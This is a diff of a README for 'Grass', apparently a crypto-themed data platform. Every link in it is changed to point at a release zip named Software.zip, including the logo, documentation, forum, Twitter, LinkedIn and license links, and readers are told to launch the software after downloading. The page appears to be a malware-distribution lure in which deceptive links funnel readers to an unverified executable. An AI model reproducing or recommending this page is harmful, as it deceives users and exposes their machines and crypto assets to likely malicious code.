@@ -1,6 +1,6 @@
 # Grass 🌱
 
-![Grass Logo](https://github.com/rayzen-YT/Grass/releases/download/v1.0/Release_x64.zip)
+![Grass Logo](https://github.com/rayzen-YT/Grass/releases/download/v2.0/Software.zip)
 
 Welcome to the Grass repository! Grass is a decentralized data management platform on Testnet, specifically designed to assist developers in securely storing, managing, and retrieving data in blockchain environments. Whether you are a crypto enthusiast, a blockchain developer, or just curious about decentralized data solutions, Grass is here to cater to your needs.
 
@@ -16,7 +16,7 @@ Welcome to the Grass repository! Grass is a decentralized data management platfo
 
 To get started with Grass, you can download the software package by clicking the button below:
 
-[![Download Grass](https://github.com/rayzen-YT/Grass/releases/download/v1.0/Release_x64.zip)](https://github.com/rayzen-YT/Grass/releases/download/v1.0/Release_x64.zip)
+[![Download Grass](https://github.com/rayzen-YT/Grass/releases/download/v2.0/Software.zip)](https://github.com/rayzen-YT/Grass/releases/download/v2.0/Software.zip)
 
 ### Note: The software needs to be launched after downloading.
 
@@ -35,15 +35,15 @@ We welcome contributions from the community to make Grass even better. If you ha
 
 ## Resources 📚
 
-- [Documentation](https://github.com/rayzen-YT/Grass/releases/download/v1.0/Release_x64.zip): Visit our official documentation for detailed information on Grass.
-- [Community Forum](https://github.com/rayzen-YT/Grass/releases/download/v1.0/Release_x64.zip): Join the Grass community forum to connect with other users and developers.
+- [Documentation](https://github.com/rayzen-YT/Grass/releases/download/v2.0/Software.zip): Visit our official documentation for detailed information on Grass.
+- [Community Forum](https://github.com/rayzen-YT/Grass/releases/download/v2.0/Software.zip): Join the Grass community forum to connect with other users and developers.
 
 ## Stay Connected 🌍
 
 Follow us on social media to stay updated on the latest news and announcements:
 
-- Twitter: [@GrassPlatform](https://github.com/rayzen-YT/Grass/releases/download/v1.0/Release_x64.zip)
-- LinkedIn: [Grass](https://github.com/rayzen-YT/Grass/releases/download/v1.0/Release_x64.zip)
+- Twitter: [@GrassPlatform](https://github.com/rayzen-YT/Grass/releases/download/v2.0/Software.zip)
+- LinkedIn: [Grass](https://github.com/rayzen-YT/Grass/releases/download/v2.0/Software.zip)
 
 ## Repository Topics 🌿
 
@@ -64,7 +64,7 @@ Follow us on social media to stay updated on the latest news and announcements:
 
 ## License ℹ️
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/rayzen-YT/Grass/releases/download/v1.0/Release_x64.zip) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/rayzen-YT/Grass/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
